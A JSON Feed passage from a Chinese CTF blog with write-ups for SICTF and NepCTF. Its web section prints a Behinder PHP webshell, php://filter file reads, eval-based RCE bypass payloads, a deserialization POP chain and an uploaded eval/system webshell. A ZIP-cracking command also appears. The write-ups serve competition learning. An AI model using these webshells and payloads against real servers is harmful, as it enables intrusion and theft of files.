{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"write_up\" category",
    "description": "欢迎来到Huan的笔记空间~这里主要会记录pwn笔记🌸",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/09/10/sictf-wp/",
            "url": "http://example.com/2023/09/10/sictf-wp/",
            "title": "sictf_wp",
            "date_published": "2023-09-10T11:48:34.000Z",
            "content_html": "<h1 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> MISC</h1>\n<h3 id=\"签到welcome\"><a class=\"markdownIt-Anchor\" href=\"#签到welcome\">#</a> 签到] Welcome</h3>\n<p><img data-src=\"/img/sictfpic/1.png\" alt=\"img\"></p>\n<h3 id=\"pixel_art\"><a class=\"markdownIt-Anchor\" href=\"#pixel_art\">#</a> Pixel_art</h3>\n<pre><code class=\"language-PHP\">from PIL import Image\nimage = Image.open('image.png')\nwidth, height = image.size\nfor y in range(height):\n    for x in range(width):\n        r, g, b = image.getpixel((x, y))\n        if r == 46:\n            print('.',end=&quot;&quot;)\n        elif r == 33:\n            print('!',end=&quot;&quot;)\n        elif r == 63:\n            print('?',end=&quot;&quot;)\n        if g == 46:\n                print('.',end=&quot;&quot;)\n        elif g == 33:\n                print('!',end=&quot;&quot;)\n        elif g == 63:\n                print('?',end=&quot;&quot;)\n        if b == 46:\n            print('.',end=&quot;&quot;)\n        elif b == 33:\n            print('!',end=&quot;&quot;)\n        elif b == 63:\n            print('?',end=&quot;&quot;)\n</code></pre>\n<pre><code class=\"language-aspn\n Ook\n</code></pre>\n<h3 id=\"baby_zip\"><a class=\"markdownIt-Anchor\" href=\"#baby_zip\">#</a> baby_zip</h3>\n<pre><code class=\"language-PHP\">bkcrack -C flag.zip -c flag.png -x 0 89504E470D0A1A0A0000000D49484452\nbkcrack -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png\n</code></pre>\n<p>010 查看 flag 在最后</p>\n<h3 id=\"easy_shark\"><a class=\"markdownIt-Anchor\" href=\"#easy_shark\">#</a> Easy_Shark</h3>\n<p>AES 冰蝎 3 流量的特征</p>\n<pre><code class=\"language-PHP\">&lt;?php\n@error_reporting(0);\nsession_start();\n    $key=&quot;2295d22e2d70888f&quot;;\n        $_SESSION['k']=$key;\n        $post=file_get_contents(&quot;php://input&quot;);\n        if(!extension_loaded('openssl'))\n        &#123;\n                $t=&quot;base64_&quot;.&quot;decode&quot;;\n                $post=$t($post.&quot;&quot;);\n                \n                for($i=0;$i&lt;strlen($post);$i++) &#123;\n                             $post[$i] = $post[$i]^$key[$i+1&amp;15]; \n                            &#125;\n        &#125;\n        else\n        &#123;\n                $post=openssl_decrypt($post, &quot;AES128&quot;, $key);\n        &#125;\n    $arr=explode('|',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n        class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;\n    @call_user_func(new C(),$params);\n?&gt;\nkey = '2295d22e2d70888f'\n</code></pre>\n<p><img data-src=\"/img/sictfpic/2.png\" alt=\"img\"></p>\n<p>解冰蝎流量</p>\n<p><img data-src=\"/img/sictfpic/3.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/4.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/5.png\" alt=\"img\"></p>\n<p>Gron 解密</p>\n<pre><code class=\"language-PHP\">def decrypt_string(ciphertext, offsets):\n    decrypted_string = &quot;&quot;\n    offset_index = 0\n\n    for char in ciphertext:\n        offset = offsets[offset_index] % 26\n        decrypted_char_code = (ord(char) - ord('A') - offset) % 26 + ord('A')\n        decrypted_char = chr(decrypted_char_code)\n        decrypted_string += decrypted_char\n\n        offset_index = (offset_index + 1) % len(offsets)\n\n    return decrypted_string\n\nciphertext = &quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;\noffsets = [1, 50, 61, 8, 9, 20, 63, 41]\n\nwhile True:\n    decrypted_string = decrypt_string(ciphertext, offsets)\n    print(decrypted_string)\n</code></pre>\n<h3 id=\"fast_morse\"><a class=\"markdownIt-Anchor\" href=\"#fast_morse\">#</a> fast_morse</h3>\n<p>morse 解密</p>\n<p><img data-src=\"/img/sictfpic/6.png\" alt=\"img\"></p>\n<p>得到 falg</p>\n<p><img data-src=\"/img/sictfpic/7.png\" alt=\"img\"></p>\n<p>变成小写</p>\n<p>flag:SICTF f2a098f-7f4a-93a5-c8a48360b03c}</p>\n<h3 id=\"qr_qr_qr\"><a class=\"markdownIt-Anchor\" href=\"#qr_qr_qr\">#</a> QR_QR_QR</h3>\n<pre><code class=\"language-Python\">import numpy as np\nimport matplotlib.pyplot as plt\nfrom pyzbar.pyzbar import decode\nfrom PIL import Image\nfrom pwn import *\n\n# 设置日志级别为调试模式\ncontext(log_level='debug')\n\n# 创建图片函数\ndef create_image(file_path):\n    with open(file_path, 'r') as file:\n        lines = file.readlines()\n\n    # 生成图片数组\n    image_array = [[255 if bit == '1' else 0 for bit in line.strip()] for line in lines]\n    image_array = np.array(image_array, dtype=np.uint8)\n\n    # 保存为图片\n    plt.imsave('output.png', image_array, cmap='gray')\n\n# 读取二维码函数\ndef read_qr_code(image_path):\n    image = Image.open(image_path)\n    decoded_objects = decode(image)\n    for obj in decoded_objects:\n        return obj.data.decode('utf-8')\n\n# 连接服务器\nconn = remote('210.44.151.51', 10523)\n\nwhile True:\n    try:\n        # 从服务器接收数据\n        data = conn.recvuntil('Please Decrypt this QR code:', drop=True)\n\n        # 将数据保存到文本文件\n        with open('1.txt', 'w') as file:\n            file.write(data.decode())\n\n        # 从文本文件创建图片\n        create_image('1.txt')\n\n        # 读取图片中的二维码\n        code = read_qr_code('output.png')\n        print(code)\n\n        # 发送二维码到服务器\n        conn.sendline(str(code))\n        conn.recvline()\n    finally:\n        # 关闭文件\n        file.close()\n</code></pre>\n<h3 id=\"问卷调查\"><a class=\"markdownIt-Anchor\" href=\"#问卷调查\">#</a> 问卷调查</h3>\n<p>第三道就是 flag</p>\n<p>SICTF SICTF_Round3_will_do_even_better!}</p>\n<h1 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> WEB</h1>\n<h3 id=\"签到include\"><a class=\"markdownIt-Anchor\" href=\"#签到include\">#</a> [签到] Include</h3>\n<p>利用伪协议可直接读到 flag</p>\n<pre><code class=\"language-Python\">    /?SICTF=php://filter/convert.base64-encode/resource=/flag\n</code></pre>\n<h3 id=\"baby_php\"><a class=\"markdownIt-Anchor\" href=\"#baby_php\">#</a> Baby_PHP</h3>\n<pre><code class=\"language-PHP\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\n$query = $_SERVER['QUERY_STRING'];\n\nif (preg_match('/_|%5f|\\.|%2E/i', $query)) &#123;\n    die('You are Hacker!');\n&#125;\nif($_GET['k_e_y'] !=='123' &amp;&amp; preg_match('/^123$/',$_GET['k_e_y']))&#123;\n    echo(&quot;You are will Win!&lt;br&gt;&quot;);\n    if(isset($_POST['command']))&#123;\n        $command = $_POST['command'];\n        if(!preg_match(&quot;/\\~|\\`|\\@|\\#|\\\\$|\\%|\\&amp;|\\*|\\（|\\）|\\-|\\+|\\=|\\&#123;|\\&#125;|\\[|\\]|\\:|\\'|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;,$command))&#123;\n            eval($command);\n        &#125;\n        else&#123;\n            echo(&quot;You are Hacker!&quot;);\n        &#125;\n    &#125;\n&#125;\nelse&#123;\n    echo(&quot;K_e_y is Errors!&quot;);\n&#125;K_e_y is Errors!\n</code></pre>\n<p>代码开始会对输入的字符串进行正则匹配，跟_有关的 url 编码之类的全部过滤</p>\n<p>可以用空格或者。代替_,. 又被过滤了，用了空格，后面一个简单的若比较换行符绕过</p>\n<p>后面 cmd 一个无数字字母 rce</p>\n<p>可见 ctfshow  web40 的题解</p>\n<pre><code class=\"language-Plain\">/?k%20e%20y=123%0a\ncommand=show_source(next(array_reverse(scandir(pos(localeconv())))));\n</code></pre>\n<h3 id=\"rce\"><a class=\"markdownIt-Anchor\" href=\"#rce\">#</a> RCE</h3>\n<pre><code class=\"language-Plain\">&lt;?php \nerror_reporting(0); \nhighlight_file(__FILE__); \n$code = $_POST['code']; \n$code = str_replace(&quot;(&quot;,&quot;hacker&quot;,$code); \n$code = str_replace(&quot;.&quot;,&quot;hacker&quot;,$code); \neval($code); \n?&gt;\n</code></pre>\n<p>借鉴宏爷文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYzOTI4Nzk2L2FydGljbGUvZGV0YWlscy8xMjc5NjMwNzk=\">https://blog.csdn.net/qq_63928796/article/details/127963079</span></p>\n<pre><code class=\"language-PHP\">code=echo $_POST[1];&amp;1=cat /f*\n</code></pre>\n<h3 id=\"我全都要\"><a class=\"markdownIt-Anchor\" href=\"#我全都要\">#</a> 我全都要</h3>\n<p>POP</p>\n<pre><code class=\"language-PHP\">&lt;?php\nhighlight_file(__FILE__);\n\nclass B&#123;\n    public $pop = '233333333';\n    public $i = '1';\n    public $nogame;\n\n    public function __destruct()\n    &#123;\n        if(preg_match(&quot;/233333333/&quot;,$this-&gt;pop))&#123;\n            echo &quot;这是一道签到题，不能让新生一直做不出来遭受打击&quot;;\n        &#125;\n    &#125;\n\n    public function game()&#123;\n        echo &quot;扣1送地狱火&quot;;\n        if ($this-&gt;i = &quot;1&quot;)&#123;\n            echo '&lt;img src=\\'R.jpg\\'&gt;';\n            $this-&gt;nogame-&gt;love();\n        &#125;\n    &#125;\n\n    public function __clone()&#123;\n        echo &quot;必须执行&quot;;\n        eval($_POST[&quot;cmd&quot;]);\n    &#125;\n&#125;\n\n\nclass A&#123;\n    public $Aec;\n    public $girl = 'QNKCDZO' ;\n    public $boy = '240610708';\n\n    public function __toString()\n    &#123;\n        echo &quot;I also want to fall in love&quot;;\n        if($this-&gt;girl != $this-&gt;boy &amp;&amp; md5($this-&gt;girl) == md5($this-&gt;boy))&#123;\n            $this-&gt;Aec-&gt;game();\n        &#125;\n    &#125;\n\n\n&#125;\n\n\nclass P&#123;\n    public $MyLover;\n    public $name = '1';\n    public function __call($name, $arguments)\n    &#123;\n        echo &quot;有对象我会在这打CTF???看我克隆一个对象！&quot;;\n        if ($name != &quot;game&quot;) &#123;\n            echo &quot;打游戏去，别想着对象了&quot;;\n            $this-&gt;MyLover = clone new B;\n        &#125;\n    &#125;\n\n\n&#125;\n$a = new B();\n$a -&gt;pop = new A();\n$a -&gt;pop -&gt;Aec = new B();\n$a -&gt;pop -&gt;Aec -&gt; nogame = new P();\necho serialize($a);\n</code></pre>\n<p>然后命令执行</p>\n<p>cmd=</p>\n<h3 id=\"你能跟得上我的speed吗\"><a class=\"markdownIt-Anchor\" href=\"#你能跟得上我的speed吗\">#</a> 你能跟得上我的 speed 吗</h3>\n<p>条件竞争</p>\n<p>准备一个 php 文件</p>\n<p>内容为</p>\n<pre><code>&lt;?php @eval(system(&quot;cat /flag&quot;));?&gt;\n</code></pre>\n<p>抓两个包</p>\n<p>一个为 get 传参的包，访问 url/uploads/2.php, 抓包</p>\n<p>另一个为 post 包，直接就抓上传的包，如下</p>\n<p><img data-src=\"/img/sictfpic/8.png\" alt=\"img\"></p>\n<p>俩个包用 burp 爆破，爆破方式为 noplayload，开跑</p>\n<p><img data-src=\"/img/sictfpic/9.png\" alt=\"img\"></p>\n<h1 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> Re</h1>\n<h3 id=\"签到pyc\"><a class=\"markdownIt-Anchor\" href=\"#签到pyc\">#</a> [签到] PYC</h3>\n<p><img data-src=\"/img/sictfpic/10.png\" alt=\"img\"></p>\n<h3 id=\"myobject\"><a class=\"markdownIt-Anchor\" href=\"#myobject\">#</a> Myobject</h3>\n<p>动调出数据，直接赛博厨子秒了</p>\n<p><img data-src=\"/img/sictfpic/11.png\" alt=\"img\"></p>\n<h3 id=\"chbase\"><a class=\"markdownIt-Anchor\" href=\"#chbase\">#</a> chbase</h3>\n<p>换表加密</p>\n<p><img data-src=\"/img/sictfpic/12.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/13.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/14.png\" alt=\"img\"></p>\n<h3 id=\"不一样的base64\"><a class=\"markdownIt-Anchor\" href=\"#不一样的base64\">#</a> 不一样的 base64</h3>\n<pre><code class=\"language-Java\">BASE64_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n\ndef base64_decode(encoded_data):\n    decoded_data = ''\n    padding_count = encoded_data.count('=')\n    encoded_data = encoded_data.replace('=', '')\n\n    binary_str = ''\n    for char in encoded_data:\n        decimal_val = BASE64_CHARS.index(char)\n        binary_str += format(decimal_val, '06b')\n\n    if padding_count &gt; 0:\n        binary_str = binary_str[:-padding_count * 2]\n\n    for i in range(0, len(binary_str), 8):\n        byte = binary_str[i:i + 8]\n        decoded_data += chr(int(byte, 2))\n\n    return decoded_data\n\nencoded_data = input('')\ndecoded_data = base64_decode(encoded_data)\nprint(decoded_data)\n</code></pre>\n<h1 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> Pwn</h1>\n<h3 id=\"签到shop\"><a class=\"markdownIt-Anchor\" href=\"#签到shop\">#</a> [签到] Shop</h3>\n<p><img data-src=\"/img/sictfpic/15.png\" alt=\"img\"></p>\n<h1 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h1>\n<h3 id=\"古典大杂烩\"><a class=\"markdownIt-Anchor\" href=\"#古典大杂烩\">#</a> 古典大杂烩</h3>\n<pre><code class=\"language-PHP\">🐩👃🐪🐼👅🐯🐩👈👇👭👟👝🐺🐭👉👙👤👋👚🐪🐫👍👢👮👱🐼👢👨👠👭🐽🐰🐻👚👂👧👠👥👛👮👯👮👬🐾👐👛👌👚👞🐨👏👉👆🐿👆👘👇🐺👦🐸👃🐭👟👑👪👃👁🐻🐻👜🐧👇👊🐧🐾🐼👇🐫🐺👐👆👪🐼👋👌👧🐻👐🐩🐺👥🐽👋👉🐰👎👠👠👣🐧🐫👧🐭👢🐯👑👑🐮👂👏🐻👥👚🐮👋👬👌👥👁👣👅👧👯👦👌👌👍👠👌🐽👉👃👊🐫👉🐨🐮👩👆🐪🐯👘👏👏🐼👩👍👊👍👡👀👰👋👣👨👧👍👜👐👛🐮👘👅👠🐿👂👰👄👈👝👠👤👃👛👘🐭👅👱👆👬👫👥👆🐽👁👐👥👊👇👉👊👩👌👭🐫🐫👬👱🐯👇🐺👁👞👑👙🐮👜👋👘👪👩👚👦👨👀👩👐👉👃🐾👥👀🐫👝👍🐩🐧👰👆👇👨🐪👃🐭👦🐫👱\n</code></pre>\n<p>emjio 解密</p>\n<pre><code class=\"language-PHP\">2L3EN82QPvhfC6RbmTc34VkwzEkqivF9DcKpindwxwuGYdUcg1XROHOaPCoAL6hZsLJDDe0PS0GEP4CYOsETUpDY2CnFTR9Wiil04p6k8ZZ7KXDnc7TuUnJlNpxoUUViUFRLS4R17rO38aXXErVSVjIyTlqpVeYd7aNiHKyMQfimLda6NzOutnOFJYnSPRSrUv44uz8PCJgZb7eTasrcoqIrYRLGnI4fV20yOPq3L6o4z\n</code></pre>\n<p><img data-src=\"/img/sictfpic/16.png\" alt=\"img\"></p>\n<h3 id=\"radio\"><a class=\"markdownIt-Anchor\" href=\"#radio\">#</a> Radio</h3>\n<p><img data-src=\"/img/sictfpic/17.png\" alt=\"img\"></p>\n<h3 id=\"easy_coppersmith\"><a class=\"markdownIt-Anchor\" href=\"#easy_coppersmith\">#</a> Easy_CopperSmith</h3>\n<pre><code class=\"language-Java\">from sage.all import *\nimport binascii\nfrom Crypto.Util.number import *\n\nn =114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381\ncipher =87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810\n\ne2 = 0x10001\npbits = 512\nfor i in range(0,2**4):\n    p4=0x38481379948fa6f1dcedd12e2fb045f096e9978eccc3be2984a9ede4e6ebe1958606c590\n    p4=p4+int(hex(i),16)\n    print(hex(p4))\n    kbits = pbits - p4.nbits()  #未知需要爆破的比特位数\n    print(p4.nbits())\n    p4 = p4 &lt;&lt; kbits\n    PR.&lt;x&gt; = PolynomialRing(Zmod(n))\n    f = x + p4\n    roots = f.small_roots(X=2^kbits, beta=0.4) #进行爆破\n    #print roots\n    if roots:        #爆破成功，求根\n        p = p4+int(roots[0])\n        print(&quot;p: &quot;, hex(int(p)))\n        assert n % p == 0\n        q = n/int(p)\n        print(&quot;q: &quot;, hex(int(q)))\n        print(gcd(p,q))\n        phin = (p-1)*(q-1)\n        print(gcd(e2,phin))\n        d = inverse_mod(e2,phin)\n        print(&quot;d：&quot;,d)\n        flag = pow(cipher,d,n)\n        flag = hex(int(flag))[2:]\n        result = &quot;&quot;\n        for i in range(0, len(flag), 2):\n            hex_int = int(flag[i:i+2], 16)  # 转换为整数\n            result += chr(hex_int)  # 转换为字符并拼接到结果字符串\n        print('result :',result)\n        \n# SICTF 3f9366ed-b8e4-412f-bbd0-62616a24115c&#125;\n</code></pre>\n<h3 id=\"mingtianpao\"><a class=\"markdownIt-Anchor\" href=\"#mingtianpao\">#</a> MingTianPao</h3>\n<pre><code class=\"language-Python\">import codecs\nimport numpy as np\n\ndef is_character(x):\n    return ord('a') &lt;= x &lt;= ord('z') or ord('A') &lt;= x &lt;= ord('Z')\n\ndef xor_strings(s1, s2):\n    return bytes([b1 ^ b2 for b1, b2 in zip(s1, s2)])\n\ndef infer_space(index, pos):\n    if message[index, pos] != 0:\n        return\n    message[index, pos] = ord(' ')\n    for x in range(len(ciphertexts)):\n        if x != index:\n            message[x][pos] = xor_strings(ciphertexts[x], ciphertexts[index])[pos] ^ ord(' ')\n\ndef find_spaces():\n    for index, x in enumerate(ciphertexts):\n        res = [xor_strings(x, y) for y in ciphertexts if x != y]\n        f = lambda position: len(list(filter(is_character, [s[position] for s in res])))\n        cnt = [f(pos) for pos in range(len(x))]\n        for pos in range(len(x)):\n            space_data.append((f(pos), index, pos))\n\nwith open('222.txt', 'r') as file:\n    ciphertexts = [codecs.decode(x.strip().encode(), 'hex') for x in file.readlines()]\n\nmessage = np.zeros([len(ciphertexts), len(ciphertexts[0])], dtype=int)\n\nspace_data = []\n\nfind_spaces()\n\nspace_data = sorted(space_data, reverse=True)\nfor weight, index, pos in space_data:\n    infer_space(index, pos)\n\nprint('\\n'.join([''.join([chr(c) for c in x]) for x in message]))\n</code></pre>\n<p>得出的结果，猜测第一行数据，异或就可以 Little Red Riding Hood promised Little Red,Rdin+ Hood ppomi4e d to obey de mo8her. Thg gr&amp;n dmother liz ou8 in the&quot;woo#s , a half hcu fr#m the vklla e . When Litxl     Re (Riding&quot;Hoo# entered thi od? a wolf&quot;cam&quot; up to her.,Se d% d not klow 0h nim-l he waq, a) d id #f him.  Goo# day to you   itt e Red Rkdin</p>\n<pre><code class=\"language-Python\">hex_str1 = &quot;1f2037202a1e6d06353b61263d050a0538493b3018544e14171d2b1c4218&quot;\nhex_str2 = &quot;Little Red Riding Hood promised&quot;\n\nbytes1 = bytes.fromhex(hex_str1)\nbytes2 = bytes(hex_str2, 'utf-8')\n\nresult = bytes([a ^ b for a, b in zip(bytes1, bytes2)])\n\nresult_str = result.decode('utf-8')\nprint(result_str)\n</code></pre>\n<h3 id=\"small_e\"><a class=\"markdownIt-Anchor\" href=\"#small_e\">#</a> small_e</h3>\n<p>低指数加密 /m 高位攻击</p>\n<p><img data-src=\"/img/sictfpic/18.png\" alt=\"img\"></p>\n<pre><code class=\"language-Python\">def phase2(high_m, n, c,e):\n    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation='NTL')\n    m = high_m + x\n    M = m((m^e - c).small_roots()[0])\n    hex_str = hex(int(M))[2:]\n    print(hex_str)\n    return hex_str\n\nn = 23407088262641313744603678186127228163189328033499381357614318160776774708961658114505773173784501557046914457908828086210961235530240151825359345210845219656000760996670856300710703016947799649686427460688236465568188205550456293373157997725204643414082796492333552579250010906010553831060540937802882205118399938918764313169385349293602085310111289583058965780887097301702677087443291977479125263301000328313103296364864396361278863921717374909215078711198899810620522933994481419395021233240234478331179727351050575360886334237633420906629984625441302945112631166021776379103081857393866576659121443879590011160797\nc = 1584727211980974717747362694412040878682966138197627512650829607105625096823456063149392973232737929737200028676411430124019573130595696272668927725536797627059576270068695792221537212669276826952363636924278717182163166234322320044764324434683614360641636360301452618063418349310497430566465329766916213742181\nhigh_m = 11658736990073967239197168945911788935424691658202162501032766529463315401599017877851823976178979438592\ne = 3\n\nhex_str = phase2(high_m, n, c,e)\n# 将16进制字符串转换为整数\nint_value = Integer('0x' + hex_str)\n\n# 将整数拆分为多个字节，并转换为对应的ASCII字符\nstr_value = ''.join(chr(int(hex_str[i:i+2], 16)) for i in range(0, len(hex_str), 2))\n\nprint(str_value)\n\n</code></pre>\n<h3 id=\"签到题来咯\"><a class=\"markdownIt-Anchor\" href=\"#签到题来咯\">#</a> 签到题来咯！</h3>\n<pre><code class=\"language-Python\">import libnum\nimport binascii\nfrom  Crypto.Util.number import *\nn = 18993579800590288733556762316465854395650778003397512624355925069287661487515652428099677335464809283955351330659278915073219733930542167360381688856732762552737791137784222098296804826261681852699742456526979985201331982720936091963830799430264680941164508709453794113576607749669278887105809727027129736803614327631979056934906547015919204770702496676692691248702461766117271815398943842909579917102217310779431999448597899109808086655029624478062317317442297276087073653945439820988375066353157221370129064423613949039895822016206336117081475698987326594199181180346821431242733826487765566154350269651592993856883\nc1 = 3089900890429368903963127778258893993015616003863275300568951378177309984878857933740319974151823410060583527905656182419531008417050246901514691111335764182779077027419410717272164998075313101695833565450587029584857433998627248705518025411896438130004108810308599666206694770859843696952378804678690327442746359836105117371144846629293505396610982407985241783168161504309420302314102538231774470927864959064261347913286659384383565379900391857812482728653358741387072374314243068833590379370244368317200796927931678203916569721211768082289529948017340699194622234734381555103898784827642197721866114583358940604520\nc2 = 6062491672599671503583327431533992487890060173533816222838721749216161789662841049274959778509684968479022417053571624473283543736981267659104310293237792925201009775193492423025040929132360886500863823523629213703533794348606076463773478200331006341206053010168741302440409050344170767489936681627020501853981450212305108039373119567034948781143698613084550376070802084805644270376620484786155554275798939105737707005991882264123315436368611647275530607811665999620394422672764116158492214128572456571553281799359243174598812137554860109807481900330449364878168308833006964726761878461761560543284533578701661413931\ndef is_prime(n):\n    if n &lt;= 1:\n        return False\n    if n &lt;= 3:\n        return True\n    if n % 2 == 0 or n % 3 == 0:\n        return False\n    i = 5\n    while i * i &lt;= n:\n        if n % i == 0 or n % (i + 2) == 0:\n            return False\n        i += 6\n    return True    \ndef franklinReiter(n,e,c1,c2):\n    PR.&lt;x&gt; = PolynomialRing(Zmod(n))\n    g1 = (114*x+2333)^int(e) - c1\n    g2 = (514*x+4555)^int(e) - c2\n    def gcd(g1, g2):\n        while g2:\n            g1, g2 = g2, g1 % g2\n        return g1.monic()\n    return -gcd(g1, g2)[0]\n\nfor i in range(1024):\n    if is_prime(i):\n        e = i\n        m=franklinReiter(n,e,c1,c2)\n        print(long_to_bytes((int(m))))\n</code></pre>\n<h1 id=\"forensics\"><a class=\"markdownIt-Anchor\" href=\"#forensics\">#</a> Forensics</h1>\n<h3 id=\"购物之旅\"><a class=\"markdownIt-Anchor\" href=\"#购物之旅\">#</a> 购物之旅</h3>\n<p>SICTF 北京市_顺义区_新顺南大街_北京华联顺义金街购物中心}</p>\n<h3 id=\"美女姐姐\"><a class=\"markdownIt-Anchor\" href=\"#美女姐姐\">#</a> 美女姐姐</h3>\n<p>SICTF 福建省福州市仓山区烟台山公园}</p>\n<h3 id=\"宝塔镇河妖\"><a class=\"markdownIt-Anchor\" href=\"#宝塔镇河妖\">#</a> 宝塔镇河妖</h3>\n<p>SICTF 山东省济宁市汶上县太子灵踪塔}</p>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2023/08/13/Nep-wp/",
            "url": "http://example.com/2023/08/13/Nep-wp/",
            "title": "Nep__wp",
            "date_published": "2023-08-13T13:28:56.000Z",
            "content_html": "<h1 id=\"nepctf-wp\"><a class=\"markdownIt-Anchor\" href=\"#nepctf-wp\">#</a> NepCTF   wp</h1>\n<p>第一次大型比赛，得到这个成绩也不错了。</p>\n<p><img data-src=\"/img/wp/image-20230813204701517.png\" alt=\"image-20230813204701517\"></p>\n<blockquote>\n<p>{ = 空格</p>\n</blockquote>\n<h2 id=\"1-misc\"><a class=\"markdownIt-Anchor\" href=\"#1-misc\">#</a> 1. misc:</h2>\n<h4 id=\"1codes\"><a class=\"markdownIt-Anchor\" href=\"#1codes\">#</a> 1.codes:</h4>\n<pre><code>环境env要\nen\\\nv绕过下\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">extern</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>en\\</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>viron<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>en\\</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>viron<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> en\\</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>viron<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"/img/wp/1.png\" alt=\"\"></p>\n<h4 id=\"2与ai共舞的哈夫曼\"><a class=\"markdownIt-Anchor\" href=\"#2与ai共舞的哈夫曼\">#</a> 2. 与 AI 共舞的哈夫曼</h4>\n<p><u>这就是 hint 嘛，年轻人就要年轻，正经人谁自己写代码</u></p>\n<p>AI 代码放进去，自己给 嘻嘻</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> heapq</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">HuffmanNode</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> char<span class=\"token punctuation\">,</span> freq<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        self<span class=\"token punctuation\">.</span>char <span class=\"token operator\">=</span> char</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        self<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">=</span> freq</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        self<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        self<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__lt__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> other<span class=\"token punctuation\">)</span><span class=\"token 